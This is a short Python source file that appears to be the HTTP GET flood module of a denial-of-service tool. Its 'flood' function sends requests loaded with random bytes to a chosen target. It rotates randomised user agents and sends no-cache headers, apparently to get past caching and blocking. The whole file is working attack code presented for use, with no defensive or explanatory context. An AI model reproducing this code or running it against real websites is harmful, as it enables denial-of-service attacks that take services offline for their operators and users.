
# Import modules
import requests
import random
import tools.randomData as randomData
from colorama import Fore

# Load user agents
user_agents = []
for _ in range(30):
	user_agents.append(randomData.random_useragent())

def flood(target):
	payload = str(random._urandom(random.randint(10, 150)))
	headers = {
		"X-Requested-With": "XMLHttpRequest",
		"Connection": "keep-alive",
		"Pragma": "no-cache",
		"Cache-Control": "no-cache",
		"Accept-Encoding": "gzip, deflate, br",
		"User-agent": random.choice(user_agents)
	}
	try:
		r = requests.get(target, params=payload, headers=headers, timeout=4)
	except Exception as e:
		print(f"{Fore.MAGENTA}Error in GET request\n{Fore.MAGENTA}{e}{Fore.RESET}")
	else:
		print(f"{Fore.GREEN}[{r.status_code}] {Fore.YELLOW}Request sent! Payload size: {len(payload)}.{Fore.RESET}")
